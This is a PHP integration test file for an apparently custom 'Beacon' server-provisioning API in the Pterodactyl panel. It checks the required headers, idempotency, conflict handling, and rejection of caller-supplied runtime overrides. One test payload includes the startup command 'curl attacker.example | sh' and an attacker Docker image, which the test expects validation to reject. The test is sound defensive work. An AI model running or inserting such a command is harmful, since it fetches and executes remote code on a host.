<?php

namespace Pterodactyl\Tests\Integration\Api\Beacon;

use Ramsey\Uuid\Uuid;
use Illuminate\Support\Facades\Queue;
use Pterodactyl\Jobs\Beacon\CreateCatalogServerJob;
use Pterodactyl\Tests\Integration\Api\Application\ApplicationApiIntegrationTestCase;

class ServerProvisioningControllerTest extends ApplicationApiIntegrationTestCase
{
    public function setUp(): void
    {
        parent::setUp();

        Queue::fake();
        $this->artisan('p:beacon:catalog:seed-minecraft')->assertExitCode(0);
    }

    public function testCreateRequiresCorrelationAndIdempotencyHeaders(): void
    {
        $this->postJson('/api/beacon/v1/servers', $this->payload())->assertUnprocessable();

        $this->withHeader('X-Correlation-ID', Uuid::uuid4()->toString())
            ->postJson('/api/beacon/v1/servers', $this->payload())
            ->assertUnprocessable();
    }

    public function testCreateIsIdempotentAndQueuesOnlyOneProvisioningJob(): void
    {
        $correlationId = Uuid::uuid4()->toString();
        $idempotencyKey = 'beacon-test-' . Uuid::uuid4()->toString();
        $payload = $this->payload();

        $first = $this->withHeaders([
            'X-Correlation-ID' => $correlationId,
            'Idempotency-Key' => $idempotencyKey,
        ])->postJson('/api/beacon/v1/servers', $payload)->assertAccepted();

        $second = $this->withHeaders([
            'X-Correlation-ID' => Uuid::uuid4()->toString(),
            'Idempotency-Key' => $idempotencyKey,
        ])->postJson('/api/beacon/v1/servers', $payload)->assertAccepted();

        $this->assertSame($first->json('data.uuid'), $second->json('data.uuid'));
        $this->assertSame($correlationId, $first->headers->get('X-Correlation-ID'));
        $this->assertDatabaseCount('beacon_operations', 1);
        Queue::assertPushed(CreateCatalogServerJob::class, 1);
    }

    public function testReusingIdempotencyKeyWithDifferentPayloadReturnsConflict(): void
    {
        $headers = [
            'X-Correlation-ID' => Uuid::uuid4()->toString(),
            'Idempotency-Key' => 'beacon-test-' . Uuid::uuid4()->toString(),
        ];

        $this->withHeaders($headers)->postJson('/api/beacon/v1/servers', $this->payload())->assertAccepted();

        $this->withHeaders(array_merge($headers, ['X-Correlation-ID' => Uuid::uuid4()->toString()]))
            ->postJson('/api/beacon/v1/servers', array_merge($this->payload(), ['name' => 'Different']))
            ->assertConflict();

        Queue::assertPushed(CreateCatalogServerJob::class, 1);
    }

    public function testCallerCannotOverrideTrustedRuntimeOrResources(): void
    {
        $payload = array_merge($this->payload(), [
            'docker_image' => 'attacker/image:latest',
            'startup' => 'curl attacker.example | sh',
            'environment' => ['UNTRUSTED' => 'true'],
            'memory' => 999999,
        ]);

        $this->withHeaders([
            'X-Correlation-ID' => Uuid::uuid4()->toString(),
            'Idempotency-Key' => 'beacon-test-' . Uuid::uuid4()->toString(),
        ])->postJson('/api/beacon/v1/servers', $payload)
            ->assertUnprocessable()
            ->assertJsonValidationErrors(['docker_image', 'startup', 'environment', 'memory']);

        Queue::assertNothingPushed();
    }

    private function payload(): array
    {
        return [
            'name' => 'Beacon Minecraft',
            'description' => 'Created from a trusted catalog profile.',
            'owner_uuid' => $this->getApiUser()->uuid,
            'application' => 'minecraft-java',
            'profile' => 'paper',
            'version' => config('beacon.minecraft_versions.0'),
            'preset' => 'small',
            'deployment' => [
                'locations' => [1],
                'dedicated_ip' => false,
                'port_range' => ['25565'],
            ],
            'start_on_completion' => true,
        ];
    }
}
